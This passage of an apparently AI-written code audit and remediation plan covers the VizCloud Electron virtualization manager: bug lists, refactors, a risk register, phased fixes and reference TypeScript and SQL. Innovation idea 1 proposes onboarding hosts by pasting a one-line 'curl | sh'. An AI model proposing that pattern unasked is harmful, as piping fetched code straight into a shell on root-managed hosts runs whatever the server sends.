**Severity:** P2  **Effort:** S  **Rules:** 13

* `src/main/services/vm.service.ts:158` — `return this.getVM(vmId) || null!;`
* `src/main/services/migration.service.ts:77` — `return this.getMigration(migrationId) || null!;`
* `src/main/services/host.service.ts:127, 136, 302` — `return (await this.getHost(hostId)) ?? null;` whose function signature claims `Promise<Host>` (no nullable).

Either the signature should be `Promise<Host | null>` or these need to throw.

### BUG-016 — `parseInt` without radix
**Severity:** P2  **Effort:** S  **Rules:** 13

`host.service.ts:192-203, 227, 233` — multiple `parseInt(x)` with no radix. ESLint rule `radix` is not enabled.

**Fix:** Add `'radix': 'error'` to ESLint, run `--fix`. Better yet, replace with `Number()` after `trim()` for non-octal-bait strings; use `parseInt(x, 10)` only when leading garbage is expected.

### BUG-017 — `parseUptime` regex pattern stringification fragile
**Severity:** P2  **Effort:** S

`host.service.ts:227-237` does `pattern.toString().match(/(day|hour|minute|second)/)?.[1]`. Cleaner to keep an explicit `[regex, unit]` tuple list. Also: the regex `/day,?(?:s)?\s*(\d+)/` requires that the digits come *after* the unit, but `uptime -p` outputs e.g. `up 2 weeks, 3 days, 4 hours`. Pattern won't match.

### BUG-018 — `cluster.service.ts:101-117` parses status with a too-broad regex
**Severity:** P2  **Effort:** S

`/(\w+)\s+(Online|Offline|Standby)/` matches `Daemons Online`, `Resources Online`, etc. inside `pcs status --brief` output. Cluster node count gets inflated.

### BUG-019 — `cluster.service.ts` always reports `status: 'healthy'`
**Severity:** P2  **Effort:** S

Line 73 hardcodes `'healthy'`. The `quorum_votes` and `quorum_threshold` are computed from `nodes.length`, but `pcs status --brief` actual quorum state is ignored.

### BUG-020 — Polling loops & metrics retention churn
**Severity:** P2  **Effort:** S

* `host.service.ts:337` — every host polls every 5s. With 50 hosts that's ~10/s of SSH handshakes.
* `metrics.service.ts:174-175` — every metrics insertion runs `DELETE FROM system_metrics WHERE timestamp < ?`. That's a full-table scan on every poll. Move to a daily retention job.

**Fix:** Use a single, multiplexed `ssh2` connection per host with channel-level commands. Replace ad-hoc polling intervals with a coordinated scheduler (`node-cron` for retention, a worker pool for SSH).

### BUG-021 — `i18n` set up but unused
**Severity:** P2  **Effort:** S  **Rules:** 4, 11

`src/renderer/i18n.ts` defines `resources` for English nav labels, but no component calls `useTranslation()`. The Sidebar hardcodes `'Dashboard'`, `'Hosts'`, etc. Either complete the integration or remove i18n entirely.

### BUG-022 — `ui` slice fields unused
**Severity:** P2  **Effort:** S

`uiSlice.ts` exports `sidebarCollapsed`, `theme`, `searchQuery`, `notificationsOpen` actions, but `Sidebar`, `Header`, and `AppLayout` never read or dispatch any of them. `Header.tsx:5` keeps a local `searchQuery` state instead of using the slice.

### BUG-023 — `connectedHosts` Map never read
**Severity:** P2  **Effort:** S

`host.service.ts:16, 300` — `connectedHosts` is set once on connect and never read. Either persist + reuse the connection (correct path: long-lived `ssh2.Client`), or delete the Map.

### BUG-024 — `validPaths` whitelist truncates silently
**Severity:** P2  **Effort:** XS

`ipc.handlers.ts:25-31` — if the renderer asks for `'foo'`, the handler silently substitutes `'userData'`. Should throw / return an error response, or at least log a warning.

### BUG-025 — Header avatar is a static `'A'`
**Severity:** P2  **Effort:** S

`Header.tsx:52` — placeholder `'A'`. No user model, no auth. Decide: single-user app (then drop the avatar) or multi-user (then add a user table + auth).

### BUG-026 — `Dashboard` "Total Hosts: +2" badge is a static decoration
**Severity:** P2  **Effort:** S  **Rules:** 3, 11

`DashboardPage.tsx:18` — `<span>+2</span>` rendered for everyone, forever.

### BUG-027 — `setTimeout`/`setInterval` not cleaned up on hot reload
**Severity:** P2  **Effort:** S

`HostService` and `MetricsService` start `setInterval`s but rely on `shutdown()` being called at `app.before-quit`. In `tsx watch` dev mode, the main process restarts without that lifecycle, leaking timers. Add a `process.on('SIGINT')` cleanup path.

### BUG-028 — Migration service doesn't `clearInterval` from `activeMigrations` Map
**Severity:** P2  **Effort:** XS

`migration.service.ts:26-29` — for-of iterates entries but the loop body never calls `clearInterval(interval)`. Map gets cleared but the underlying timers keep running.

```ts
for (const [, interval] of this.activeMigrations) clearInterval(interval);
```

### BUG-029 — `cluster.service.ts` always picks the discoverer host as the master
**Severity:** P2  **Effort:** S

Line 71 — `master_host_id: hostId`. Real Pacemaker/Corosync clusters have an elected DC (Designated Controller), discoverable via `pcs status --full | grep "Current DC"` or `crm_mon -1 -X`.

### BUG-030 — No tag invalidation in any RTK Query slice
**Severity:** P2  **Effort:** S

After `addHost`/`updateHost`/`deleteHost` mutations, `getHosts` doesn't refetch. Add `tagTypes: ['Host']` and `providesTags`/`invalidatesTags`.

### BUG-031 — `ErrorBoundary` only logs to `console.error`
**Severity:** P2  **Effort:** S

Renderer-side errors should route to the main-process logger (and the DB `logs` table if/when it goes live), so they're captured even when devtools are closed. Add an `errorReport` IPC channel.

### BUG-032 — `getHost` duplicated in 3 services
**Severity:** P2  **Effort:** S  **Rules:** 4

Identical private `getHost(hostId)` impls in `vm.service.ts:387-394`, `cluster.service.ts:120-127`, `migration.service.ts:189-196`, `metrics.service.ts:187-193`. Promote to a `HostRepository` (or just import from `host.service.ts`).

### BUG-033 — Unused vars / unused imports
**Severity:** P2  **Effort:** XS

Selected examples:
* `migration.service.ts:26` — `migrationId` from `for-of` destructure is unused.
* `host.service.ts:32` — `hostId` from `for-of` destructure is unused.
* `metrics.service.ts:25` — same.
* `vm.service.ts:9` — `VMSnapshot` imported but never referenced.

After fixing `tsconfig.main.json` (BUG-005) these would surface as errors.

### BUG-034 — `process.on('uncaughtException')` and `unhandledRejection` only log
**Severity:** P2  **Effort:** S

`main.ts:218-225` — logs but doesn't exit. Best practice: log, attempt graceful shutdown, then exit non-zero so the auto-restarter (or user) sees the failure. Otherwise the app drifts in an undefined state.

### BUG-035 — Window position math fails on multi-monitor / portrait
**Severity:** P2  **Effort:** XS

`main.ts:127-128`
```ts
x: (screenWidth - 1400) / 2,
y: (screenHeight - 900) / 2,
```
On a small/secondary display these compute negative coords. Use `Math.max(0, ...)` or persist last window bounds via `electron-window-state`.

### BUG-036 — `migration.service.ts:144` — `virsh migrate-cancel <vmId>` uses internal UUID
**Severity:** P2  **Effort:** S

`migrate-cancel` expects the VM's libvirt name (or domain UUID), not VizCloud's internal UUID. Currently passes `migration.vmId` which is the row's `id`, not the VM's name. Cancellation will always fail.

---

## 5. Refactoring Opportunities (P3) — Hygiene & Innovation

### REFACTOR-001 — Split `IpcChannels` into a typed contract
**Severity:** P3  **Effort:** S

Channel names live as bare strings in `ipc.handlers.ts`. Define a single `src/shared/ipc/contract.ts`:
```ts
export const IPC = {
  app: { getVersion: 'app:get-version', /* ... */ },
  hosts: { list: 'hosts:list', get: 'hosts:get', add: 'hosts:add' /* ... */ },
} as const;

export interface IpcMap {
  'app:get-version': { req: void; res: string };
  'hosts:list':      { req: void; res: Host[] };
  /* ... */
}
```
Both main and preload (and renderer baseQuery) reference the same map. Adds compile-time safety.

### REFACTOR-002 — Replace ad-hoc `databaseService.prepare(sql)` with Kysely or Drizzle
**Severity:** P3  **Effort:** L

Eliminates: hand-built `INSERT`/`UPDATE` lists, snake↔camel mismatches (DATA-003), positional `?` mismatches (BUG-008), and untyped `as any` casts on rows. Drizzle in particular has zero-runtime-overhead types and a migration runner.

### REFACTOR-003 — Centralize SSH/libvirt access into a Connection abstraction
**Severity:** P3  **Effort:** L

Today every service shells out to `ssh ... root@... "<virsh ...>"`. Create:
```ts
class HostConnection {
  constructor(private opts: HostConnectionOpts);
  async run(argv: string[], opts?: { timeoutMs }): Promise<{ stdout, stderr, code }>;
  async libvirt(): Promise<LibvirtAdapter>;  // ssh2 channel running virsh non-interactively
  close(): Promise<void>;
}
```
All five services consume this; injection vectors disappear; one connection pool per host (shared).

### REFACTOR-004 — Replace polling with a push model
**Severity:** P3  **Effort:** L

Today: 5s host poll + 30s metrics poll. Future: long-running collector daemon on each host that pushes events over mTLS WebSocket; host page shows truly live state. Or: libvirt has an event API (`virConnectDomainEventRegisterAny`) — node-libvirt exposes it; subscribe to power state, migration progress, snapshot events.

### REFACTOR-005 — Adopt `electron-vite`
**Severity:** P3  **Effort:** M

`vite-plugin-electron` plus a hand-rolled `tsconfig.main.json` is brittle (BUG-005). `electron-vite` (https://electron-vite.org) gives you main/preload/renderer entries, hot-reload for all three, and emits CJS/ESM correctly per entry. It also auto-handles native module externalization (better-sqlite3).

### REFACTOR-006 — Adopt feature folders, not layer folders
**Severity:** P3  **Effort:** M

Today the structure is layered: `pages/`, `components/atoms/`, `services/`, `slices/`. As features grow this scales poorly — to add cluster fencing UI you touch 7+ folders. Consider:
```
src/features/
  hosts/   { ui/, ipc/, service/, slice/, types.ts }
  vms/
  clusters/
  migration/
src/shared/   types, design tokens
src/main/
src/renderer/
```
Atomic Design is preserved within each feature's `ui/` folder.

### REFACTOR-007 — Bring in Vitest UI / Storybook for the design system
**Severity:** P3  **Effort:** M  **Rules:** 12

Atoms/molecules/organisms are exactly what Storybook is built for. With Storybook 8 + Vite, you get visual docs, Chromatic for visual regression, and an isolated environment to develop components without bootstrapping Electron. Pairs with Rule 12 ("next-gen GUI").

### REFACTOR-008 — Replace `react-icons` with `lucide-react`
**Severity:** P3  **Effort:** XS

`react-icons` ships every icon set (~5MB). `lucide-react` is tree-shakeable, clean, single style. Tiny bundle win and visual consistency.

### REFACTOR-009 — Extract `theme.ts` into a CSS-variable bridge
**Severity:** P3  **Effort:** S

Today `theme.ts` is a TS object that nothing reads. After fixing BUG-003, generate `:root { --bg-page: #0f0f16; ... }` from `theme.ts` at build time and configure Tailwind to read CSS variables (`bg-page: 'var(--bg-page)'`). This lets you flip themes at runtime without rebuilding (`uiSlice.theme` finally pays off).

### REFACTOR-010 — Add observability primitives early
**Severity:** P3  **Effort:** M  **Rules:** 12

* Structured logs (already half there with electron-log) → ship to OpenTelemetry collector.
* Tracing: span around each IPC call, each SSH/libvirt op, propagate `trace_id` to remote SSH commands via `LC_TRACE_ID` env (most sshd configs allow `LC_*` whitelist).
* Metrics: Prometheus textfile collector exposed on `localhost:9100` for the Electron main, scraped by an embedded sidecar exporter.

### REFACTOR-011 — Topology page: D3 + force-directed graph + WebGL fallback
**Severity:** P3  **Effort:** L  **Rules:** 12

`TopologyPage` is a placeholder. For 30-year-of-IT-trade-driven design: render hosts as nodes, VMs as orbiting children, cluster membership as colored arcs. Use `react-force-graph` (Three.js under the hood) which scales to thousands of nodes with WebGL. Drop into a fullscreen mode for ops centers.

### REFACTOR-012 — Diagnostics page: structured rule engine
**Severity:** P3  **Effort:** L  **Rules:** 12

Have the Diagnostics page run a list of YAML-defined checks (a la `solidfire-check` / `kube-bench`): each check is `{ id, severity, command, expect, fix_hint }`. Result page shows pass/fail with one-click "Open shell to host" for fix.

### REFACTOR-013 — Plugins / playbook engine
**Severity:** P3  **Effort:** XL  **Rules:** 12

`DEVELOPMENT.md` references `workflow_engine.py` and `WORKFLOW_SCHEMA.md` (which don't exist in this repo) for "VMware → Morpheus migration playbooks". This is huge and worth scoping separately, but if it's coming, design for it now: a playbook runner consuming JSON schemas, structured per-step telemetry, dry-run mode, idempotency, versioned playbooks, signed playbooks.

### REFACTOR-014 — Adopt `zod` for all I/O boundaries
**Severity:** P3  **Effort:** M  **Rules:** 13

Every IPC call, every DB row, every SSH parse output should pass through a `zod` schema before being treated as a typed object. This would have caught the snake/camel mismatch (DATA-003), the empty metrics parser (BUG-009), and the loose cluster regex (BUG-018) at runtime. Zod also generates TS types — single source of truth.

### REFACTOR-015 — Persist window state, settings, last-selected host
**Severity:** P3  **Effort:** S

Use `electron-window-state` and a typed `settings` table query. Today every launch starts at 1400×900 dead-center.

### REFACTOR-016 — `app.requestSingleInstanceLock()`
**Severity:** P3  **Effort:** XS

Currently `'second-instance'` listener is registered but `requestSingleInstanceLock()` is never called. Without the lock the second listener never fires.

### REFACTOR-017 — Drop `react-i18next` until you actually translate
**Severity:** P3  **Effort:** XS  **Rules:** 4

Or fully integrate it (BUG-021).

### REFACTOR-018 — Vendor a `preload.d.ts` for the renderer
**Severity:** P3  **Effort:** XS

Once the preload is built, ship a `src/renderer/preload.d.ts` that declares `interface Window { vizcloud: VizCloudAPI }`. Renderer gets full IntelliSense for the bridge.

### REFACTOR-019 — Strict CI gates
**Severity:** P3  **Effort:** S  **Rules:** 13

`npm run typecheck && npm run lint && npm run test:coverage --reporter=json --coverage.thresholdAutoUpdate=false --coverage.lines=90 --coverage.branches=90 --coverage.functions=90 --coverage.statements=90 && npm run test:e2e && npm run build` — wire as a single GitHub Actions job that gates merges. Add `actions/dependency-review-action` and `npm audit --audit-level=high`.

### REFACTOR-020 — License headers + SPDX
**Severity:** P3  **Effort:** XS

`package.json` says MIT but no `LICENSE` file is in the repo (per glob). Add it; add SPDX headers to source.

---

## 6. Documentation Issues

* **README.md:117-121** — "19 unit tests passing | 100% component coverage" — true at the surface but only because skipped tests aren't counted and no service code is covered. Misleading.
* **README.md:155-164 (Security)** — every claim ("Encrypted Storage", "CSP enforced", "No Eval") is unverified or outright false (see SEC-003, SEC-006, BUG-001 dynamic-import-not-eval).
* **README.md:188-202 (Distribution Artifacts)** — implies the .dmg/.exe are signed/notarized. They are not (SEC-008).
* **DEVELOPMENT.md:716** — "Quick Reference Links: ROADMAP.md, CHANGELOG.md" — neither file exists.
* **DEVELOPMENT.md:62-64** — references `docs/ARCHITECTURE.md`, `docs/WORKFLOW_SCHEMA.md`, `workflow_engine.py` — none of these exist.
* **PROJECT_SUMMARY.md** (not read in detail in this audit) likely contains the same false-100% language.
* **API.md** — claims a complete API reference. Probably documents endpoints that don't exist (no HTTP server, no IPC channels for domain ops).

**Fix:** Audit every doc against ground-truth code, mark what's implemented vs. designed vs. roadmap. Establish a doc-CI rule: no doc claim without a test that exercises the claim.

---

## 7. Innovation / "Bleeding-Edge" Backlog (Rule 12)

Given your background (DevOps, virtualization, security, network engineering — Palo Alto / WatchGuard), here are higher-impact innovation bets specific to VizCloud:

1. **Zero-trust agent-less host onboarding via SSH CA.** Instead of password/key per host, configure VizCloud to issue short-lived SSH certs from a local CA (built on `ssh-keygen -s`) with principal restrictions. The user's host onboarding flow becomes: "paste this one-line `curl | sh` on the host" which installs the CA pubkey. No persistent secrets.

2. **Live network/firewall topology.** With your firewall background — pull WatchGuard/Palo Alto config via REST and overlay zones/VLANs onto the topology graph. Show "this VM is in trust zone X, can talk to Y via rule Z". Click a VM, see its egress matrix.

3. **eBPF-based metrics collector.** Instead of polling `/proc/stat`, install a tiny eBPF program (via `bcc` or `bpftrace`) on each host that streams per-process IO/network/CPU events at near-zero cost. Differentiator vs. all incumbents.

4. **Pacemaker DSL → graphical editor.** PCS configs are notoriously tricky. A drag-drop editor that emits/parses `pcs config show` output would be unique in the market.

5. **AI-assisted capacity planning.** Train a small local model (or call out to an LLM with tool use) on historical metrics to predict "by July you'll need 2 more hosts" and propose live migrations to balance load. Make sure it's *advisory* — never auto-actions resources.

6. **Forensic mode.** When a VM enters `crashed`, snapshot the host journal, libvirt logs, and last 60s of metrics into a single signed bundle (zstd + ed25519). Investigate later, share with vendor support, replay.

7. **WireGuard mesh between VizCloud client and managed hosts.** Optional, but for distributed teams managing remote DCs, replace direct SSH over the public internet with a built-in WG tunnel + jump host posture.

8. **Plugin SDK with Webview-on-WebView.** Once features stabilize, expose a plugin API: an internal MCP-like server in main, plugins are signed JS bundles loaded into a sandboxed `<webview>` with their own preload. Lets the community ship integrations (Technitium, Juniper, Velero, etc. — your DEVELOPMENT.md hints at this) without forking VizCloud.

---

## 8. Verification Standards Against `DEVELOPMENT.md`

Direct cross-walk of DEVELOPMENT.md verification commands vs. current state:

| DEVELOPMENT.md mandate                                           | Current reality                                                        | Verdict       |
| ---------------------------------------------------------------- | ---------------------------------------------------------------------- | :-----------: |
| `npm run typecheck` → 0 errors                                   | Main process not type-checked at all (`tsconfig.app.json` excludes it) |  ❌ unverified |
| `npm run lint` → 0 errors                                        | Cannot run — eslint config imports missing plugins                     |       ❌       |
| `npm run build` → clean                                          | Main bundle would compile but main runtime crashes (DB-001)            |       ❌       |
| `npm run test:coverage` → 90%+                                   | No coverage threshold configured; service code 0% covered              |       ❌       |
| `npm run test:e2e` → passes                                      | Tests Vite browser, not Electron (TEST-002)                            |     ⚠️ false  |
| `npm run test:visual`                                            | Script not defined in package.json                                     |       ❌       |
| `npm run test:a11y`                                              | Script not defined in package.json                                     |       ❌       |
| `npm run analyze`                                                | Script not defined in package.json                                     |       ❌       |
| Lighthouse 90+                                                   | Not measured                                                           |       ❌       |
| Bundle < 500KB gzipped                                           | Likely true today (445KB) but app doesn't function                     |     ⚠️ N/A    |
| Browser compatibility (Chrome/FF/Safari/Edge/iOS/Android)        | Electron app — only Chromium runs; mobile irrelevant                   |    Misapplied |
| Multi-platform packaging signed                                  | No signing config                                                      |       ❌       |

---

## 9. Risk Register (top 10, ranked)

| #  | Risk                                                                                | Severity | Likelihood | Mitigation                          |
| -- | ----------------------------------------------------------------------------------- | :------: | :--------: | ----------------------------------- |
| 1  | App fails to start on first launch (DB-001)                                         |    P0    |     100%   | Fix schema indexes (½ day)          |
| 2  | Renderer can't reach main; entire UI is non-functional (SEC-001/ARCH-002)           |    P0    |     100%   | Build preload + IPC contract (1 wk) |
| 3  | Remote root code execution on every managed host (SEC-002)                          |    P1    |     High   | Switch to spawn(argv)+ssh2 (1 wk)   |
| 4  | Misleading "production-ready" claim ships to user / customer                        |    P1    |     High   | Re-baseline docs (½ day)            |
| 5  | Data-loss on every host poll (DATA-001)                                             |    P1    |     High   | UPSERT migration (½ day)            |
| 6  | No code signing → installs blocked by macOS Gatekeeper / Win SmartScreen (SEC-008)  |    P1    |     100%   | Configure signing/notarize (1 wk)   |
| 7  | Schema drift over time with no migration runner (DATA-002)                          |    P1    |     Med    | Add migration runner (1 day)        |
| 8  | Dev-machine-only absolute path imports (BUG-001)                                    |    P0    |     High   | Find/replace + lint guard (½ hr)    |
| 9  | Tailwind unstyled rendering (BUG-003)                                               |    P0    |     100%   | Add tailwind/postcss configs (½ d)  |
| 10 | No service tests; regression risk during refactor                                   |    P1    |     High   | Test pyramid + CI gate (1 wk)       |

---

## 10. Phased Remediation Plan

**Premise:** Every phase is a *real* working slice — you can ship it, demo it, and roll back to it. Phases stack, never overlap. Estimates assume one senior engineer full-time.

### Phase 0 — Baseline Honesty & Repo Hygiene (½ week)

Goal: stop the bleeding on misleading documentation; make the repo work for any contributor.

* **DOC-001** — Rewrite `COMPLETION_REPORT.md`, `CURRENT_TASKS.md`, `README.md` to reflect reality. Re-baseline as `pre-alpha`.
* **BUG-001** — Replace hardcoded `/Users/cnelson/.openclaw/...` imports with `@shared/types`. Add `no-restricted-imports` ESLint rule with `pattern: ['/Users/**', '/home/**', 'C:\\\\**']`.
* **BUG-004** — Pick flat ESLint config, install missing plugins, delete `.eslintrc.json`.
* **BUG-005** — Fix `tsconfig.main.json` (remove `strictNullChecks: false`); make `npm run typecheck` cover both configs.
* **REFACTOR-019** — Wire one CI job: typecheck + lint + test. Rejects merges that fail.
* **BUG-013** — Delete duplicate `common/{LoadingSpinner,ErrorBoundary}.tsx`.
* Add `LICENSE` and SPDX headers (REFACTOR-020).

**Exit criteria:** `npm install && npm run typecheck && npm run lint && npm run test` succeeds on a fresh clone. Docs no longer claim 100%.

---

### Phase 1 — Make It Run (1 week)

Goal: a clean dev launch shows the dashboard with at least one real round-trip from renderer → main → DB → renderer.

* **DB-001** — Rewrite schema with proper `CREATE INDEX` statements; add a migration runner (DATA-002).
* **BUG-003** — Add `tailwind.config.js` and `postcss.config.js`; bridge `theme.ts` → Tailwind tokens.
* **BUG-002** — Fix `index.html` `<div id>` mismatch.
* **BUG-006** — Fix `StatusBadge` template literal.
* **SEC-001 / ARCH-001** — Create `src/main/preload/preload.ts` with a typed `contextBridge.exposeInMainWorld('vizcloud', { ... })` surface. Use `REFACTOR-001`'s shared contract.
* **ARCH-002** — Write a custom RTK Query `baseQuery` that calls `window.vizcloud.invoke(channel, args)`. Replace all five APIs' `fetchBaseQuery({ baseUrl: '/api' })`.
* **REFACTOR-005** — Migrate to `electron-vite` (or document why not).
* Implement IPC handlers for `hosts:list` and `hosts:get` (real, hooked into `HostService.getAllHosts()`).
* DashboardPage: replace hardcoded `0`s with `useGetHostsQuery()` count.
* Add Playwright Electron mode (TEST-002) with one smoke test: launch app, navigate, see real (zero) host count.

**Exit criteria:** `npm run dev` opens a styled, functional window. Connect to a host (mock at first), see the count update on the dashboard, observe IPC traffic in DevTools. CI green.

---

### Phase 2 — First End-to-End Vertical: Hosts (1.5 weeks)

Goal: full host CRUD lifecycle, secure-by-default, with tests.

* **SEC-002** — Replace `exec(shellString)` with `ssh2.Client` + `spawn(argv[])`. Implement `HostConnection` abstraction (REFACTOR-003).
* **SEC-003** — Use `safeStorage` for password storage. Make key/agent auth the default.
* **SEC-005** / **SEC-006** — Tighten navigation handler; add CSP via `webRequest.onHeadersReceived`.
* **DATA-001** — Replace `INSERT OR REPLACE` with `INSERT ... ON CONFLICT(id) DO UPDATE`; wrap discovery in `db.transaction()`.
* **DATA-003** — Introduce `rowToHost` mapper or migrate to Kysely (REFACTOR-002).
* **BUG-008** — Fix host insert column/value alignment.
* HostsPage: real grid, "Add Host" modal, status badges driven by live data, polling via SSE-style IPC events (not `setInterval` in renderer).
* **TEST-003** — 90%+ coverage on `host.service.ts` and the hosts IPC handlers.

**Exit criteria:** Add a real host (with key auth), see it appear, status updates in near-real-time, deletion cascades cleanly. CSP enforced. 0 lint warnings. Unit + e2e tests cover all happy + 3 sad paths per operation.

---

### Phase 3 — VMs, Clusters, Migrations, Metrics (2 weeks)

Repeat the Phase-2 pattern for each remaining vertical. In order:

1. **VMs** — Fix BUG-007 (`split(/\s+/)`), real `dumpxml` parser, full lifecycle ops, libvirt event subscription. Replace fabricated disk source path. (~3 days)
2. **Clusters** — Real PCS parsing (BUG-018), real DC detection (BUG-029), quorum status. (~2 days)
3. **Migrations** — Live progress via `virsh migrate --verbose` streamed (BUG-010), pre-flight checks, cancel by libvirt name (BUG-036), rollback on partial failure. (~3 days)
4. **Metrics** — Real `/proc/*` parsing (BUG-009), batch inserts, retention as a daily job. (~2 days)

Cross-cutting: `BUG-032` (consolidate duplicated `getHost`), tag invalidation across RTK Query slices (BUG-030), error reporting via main-process logger (BUG-031).

**Exit criteria:** All 9 pages functional against a real lab environment (one cluster of two hosts, a few VMs). No mock data anywhere in production paths. 90%+ overall coverage.

---

### Phase 4 — Hardening, Packaging, Release (1 week)

Goal: a build that's signed, notarized, auto-updating, and observably healthy.

* **SEC-004** — `app.enableSandbox()` unconditionally.
* **SEC-007** — Electron Fuses configured.
* **SEC-008** — macOS notarization, Windows EV signing, electron-updater wired.
* **SEC-009** — Drop `process.env` IPC handler.
* **REFACTOR-014** — `zod` schemas at all I/O boundaries.
* **REFACTOR-015** — Persist window state.
* **REFACTOR-019** — Full CI matrix: macOS-arm64, macOS-x64, Windows, Linux.
* **REFACTOR-016** — `app.requestSingleInstanceLock()`.
* Fold visual regression (Storybook + Chromatic) into CI (REFACTOR-007).
* **DOC-001** — Final pass: feature matrix, security architecture doc, runbook, release notes, threat model.

**Exit criteria:** `npm run package:mac` produces a signed, notarized DMG that opens cleanly on a fresh user account; ditto Windows / Linux. `electron-updater` checks GitHub Releases and updates atomically. Docs match code 1:1. Project can *honestly* be called `1.0.0-beta`.

---

### Phase 5 — Innovation (open-ended)

Pick from §7 based on your roadmap and customer pull. The work in Phases 0-4 leaves a clean foundation to add any of those features without further refactor-debt accumulating.

---

## 11. Reference Implementations

### 11.1 Preload bridge (Phase 1 starting point)

```ts
// src/main/preload/preload.ts
import { contextBridge, ipcRenderer } from 'electron';
import type { IpcMap } from '@shared/ipc/contract';

const api = {
  invoke: <K extends keyof IpcMap>(channel: K, args: IpcMap[K]['req']): Promise<IpcMap[K]['res']> =>
    ipcRenderer.invoke(channel, args),
  on:     <K extends keyof IpcMap>(channel: K, fn: (payload: IpcMap[K]['res']) => void): (() => void) => {
    const handler = (_: unknown, payload: IpcMap[K]['res']): void => fn(payload);
    ipcRenderer.on(channel, handler);
    return () => { ipcRenderer.off(channel, handler); };
  },
};

contextBridge.exposeInMainWorld('vizcloud', api);

export type VizCloudApi = typeof api;
```

### 11.2 RTK Query baseQuery over IPC (Phase 1)

```ts
// src/renderer/store/api/ipcBaseQuery.ts
import type { BaseQueryFn } from '@reduxjs/toolkit/query';
import type { IpcMap } from '@shared/ipc/contract';

type Args<K extends keyof IpcMap> = { channel: K; payload: IpcMap[K]['req'] };

export const ipcBaseQuery: BaseQueryFn<Args<keyof IpcMap>, unknown, { code: string; message: string }> =
  async ({ channel, payload }) => {
    try {
      const data = await window.vizcloud.invoke(channel, payload as never);
      return { data };
    } catch (e) {
      const err = e instanceof Error ? e : new Error(String(e));
      return { error: { code: 'IPC_FAILED', message: err.message } };
    }
  };
```

### 11.3 ssh2-based command runner (Phase 2)

```ts
// src/main/lib/ssh.ts
import { Client, ClientChannel } from 'ssh2';

export async function runRemote(
  conn: Client, argv: string[], opts?: { timeoutMs?: number }
): Promise<{ stdout: string; stderr: string; code: number }> {
  // Quote each arg for the remote shell *or* (better) use exec without shell parsing.
  // ssh2 allows raw exec — the remote shell still parses, so quote rigorously.
  const cmd = argv.map(a => `'${a.replace(/'/g, `'\\''`)}'`).join(' ');
  return new Promise((resolve, reject) => {
    let timer: NodeJS.Timeout | undefined;
    if (opts?.timeoutMs) timer = setTimeout(() => reject(new Error('timeout')), opts.timeoutMs);
    conn.exec(cmd, (err, stream: ClientChannel) => {
      if (err) { if (timer) clearTimeout(timer); return reject(err); }
      let stdout = '', stderr = '';
      stream
        .on('close', (code: number) => { if (timer) clearTimeout(timer); resolve({ stdout, stderr, code: code ?? 0 }); })
        .on('data', (d: Buffer) => { stdout += d.toString('utf8'); })
        .stderr.on('data', (d: Buffer) => { stderr += d.toString('utf8'); });
    });
  });
}
```

### 11.4 Schema rewrite (extract — Phase 1)

```sql
CREATE TABLE IF NOT EXISTS hosts (
    id TEXT PRIMARY KEY,
    hostname TEXT NOT NULL UNIQUE,
    ip_address TEXT NOT NULL,
    -- ...rest of cols
    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now') * 1000),
    updated_at INTEGER NOT NULL DEFAULT (strftime('%s','now') * 1000)
);
CREATE INDEX IF NOT EXISTS idx_hosts_hostname    ON hosts(hostname);
CREATE INDEX IF NOT EXISTS idx_hosts_cluster_id  ON hosts(cluster_id);
CREATE INDEX IF NOT EXISTS idx_hosts_status      ON hosts(status);
CREATE INDEX IF NOT EXISTS idx_hosts_datacenter  ON hosts(datacenter);
```

### 11.5 UPSERT pattern (Phase 2)

```ts
const stmt = db.prepare(`
  INSERT INTO hosts (id, hostname, ip_address, /* ... */, updated_at)
  VALUES (@id, @hostname, @ip_address, /* ... */, @now)
  ON CONFLICT(id) DO UPDATE SET
    hostname=excluded.hostname,
    ip_address=excluded.ip_address,
    /* explicitly list only the fields you want to refresh */
    updated_at=excluded.updated_at
`);
```

---

## 12. Quick Wins (under 4 hours total)

If you want a few high-impact tactical fixes before a full Phase 0:

1. (15 min) **BUG-001** — Find/replace `'/Users/cnelson/.openclaw/workspace/VizCloud/src/shared/types/index'` → `'@shared/types'`.
2. (15 min) **BUG-002** — `index.html` `id="root"`.
3. (15 min) **BUG-006** — Fix `StatusBadge` template literal.
4. (20 min) **DB-001** — Rewrite `schema.ts` to extract indexes.
5. (10 min) **BUG-012** — `RootState = ReturnType<typeof store.getState>`.
6. (15 min) **SEC-004** — Remove the `darwin` guard around `enableSandbox()`.
7. (1 hr) **DOC-001** — Rewrite `COMPLETION_REPORT.md` and `CURRENT_TASKS.md` to honest baselines.
8. (1 hr) **REFACTOR-016** — `requestSingleInstanceLock()`.

These don't make the app *work* (you still need Phase 1 for that), but they erase a class of "first impression" red flags for any new contributor.

---

## 13. Verification of This Review

The findings here were produced by direct file reads of the source tree (not generation), with file:line references throughout. A representative sample of what was inspected:

* All 5 service files (`host`, `vm`, `cluster`, `migration`, `metrics`)
* All 5 RTK Query slices
* All 9 page components
* `main.ts`, `window.manager.ts`, `ipc.handlers.ts`, `logger.service.ts`
* `database.service.ts` and full `schema.ts`
* `shared/types/index.ts`
* All TypeScript & ESLint config files (incl. legacy + flat)
* Vite, Vitest, Playwright configs
* All test files (3 unit, 2 e2e, 1 setup)
* `index.html`, layout components (Sidebar, Header, AppLayout)
* `theme.ts`, atoms `index.ts`, `DataCard`
* Project rule docs (`DEVELOPMENT.md`, `README.md`, `COMPLETION_REPORT.md`, `CURRENT_TASKS.md`)

Spot-checks via Grep confirmed:
* No `contextBridge` / `ipcRenderer` / `window.electron` calls anywhere in `src/`.
* No `tailwind.config.*` or `postcss.config.*` in the repo root.
* No `preload.ts` / `preload.js` source under `src/`.
* The hardcoded `/Users/cnelson/.openclaw/...` path appears in exactly two source files.

Where I made educated calls about runtime behavior (e.g., better-sqlite3 rejecting inline `INDEX` statements), those follow from documented SQLite syntax — not running the app. The fastest way to confirm the most important findings is to:

```bash
npm install
npm run typecheck   # expect: pass for app config, untested for main config
npm run lint        # expect: ERR_MODULE_NOT_FOUND on plugin imports
npm run dev         # expect: SqliteError on schema exec, then renderer mount failure
```

Each of those should reproduce a critical finding within minutes.

---

## Appendix A — Backlog Snapshot (for ticketing)

(Live, filterable version is in the companion HTML artifact.)

| ID            | Sev | Effort | Title                                                            |
| ------------- | :-: | :----: | ---------------------------------------------------------------- |
| SEC-001       | P0  |   M    | No preload script; renderer has no API surface                   |
| ARCH-002      | P0  |   L    | RTK Query targets nonexistent HTTP server                        |
| DB-001        | P0  |   S    | SQLite schema uses MySQL inline INDEX clauses                    |
